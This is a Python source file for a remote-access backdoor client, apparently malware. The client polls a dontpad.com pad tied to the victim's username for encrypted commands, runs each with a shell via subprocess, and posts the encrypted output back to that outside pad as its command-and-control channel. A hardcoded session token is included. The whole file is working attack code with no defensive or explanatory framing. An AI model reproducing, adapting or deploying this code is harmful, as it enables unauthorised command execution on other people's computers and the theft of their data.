import requests
import time
import subprocess
from observer import Observer
import getpass
from criptographer import Criptographer

class Client:
    def __init__(self, url):
        self.url = url
        self.command = ''
        self.result = ''
        self.first_run = True
        self.username = getpass.getuser()
    
    def start(self, command_body):
        print("Comando recebido: ", command_body)
        if self.first_run:
            self.first_run = False
            self.send_result_to_c2()
            
        self.execute_command(command_body)

    def parse_text_dontpad(self, data):
        try:
            decrypted_data = Criptographer.decrypt(data, self.username)
            if "___________________" in decrypted_data:
                parts = decrypted_data.split("___________________", 1)
                self.command = parts[0].strip()
                self.result = parts[1].strip()
            else:
                self.command = data.strip()
                self.result = ""
        except:
            pass
    def execute_command(self, command_body):
        self.parse_text_dontpad(command_body)
        if self.command is None or self.command.lower() == "exit":
            return
        
        self.result = self.execute()
        self.send_result_to_c2()

    def execute(self):
        try:
            processo = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="ignore"
            )
            stdout, stderr = processo.communicate(timeout=20)
            if stderr:
                return f"Erro na execução do comando: {stderr}"
            return stdout.replace("�", "")
        except Exception as e:
            return f"Erro na execução do comando: {e}"

    def send_result_to_c2(self):
        data = {
            "text": Criptographer.encrypt(self.command + "\n___________________\n\n" + self.result, self.username),
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": "-25751fc88e6e559870fd"
        }
        
        requests.post(f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}", data=data)


if __name__ == "__main__":
    username = getpass.getuser()

    base_url = "https://api.dontpad.com"
    pad_name = "yaguinhofodinha"
    session_token = "-25751fc88e6e559870fd"

    url_with_username = (
        f"{base_url}/{pad_name}/{username}.body.json"
        f"?lastModified=0&session-token={session_token}"
    )

    first_url = (
        f"{base_url}/{pad_name}.body.json"
        f"?lastModified=0&session-token={session_token}"
    )

    client = Client(url=url_with_username)
    observer = Observer(first_url=first_url, url_with_username=url_with_username, client=client)
    observer.start()
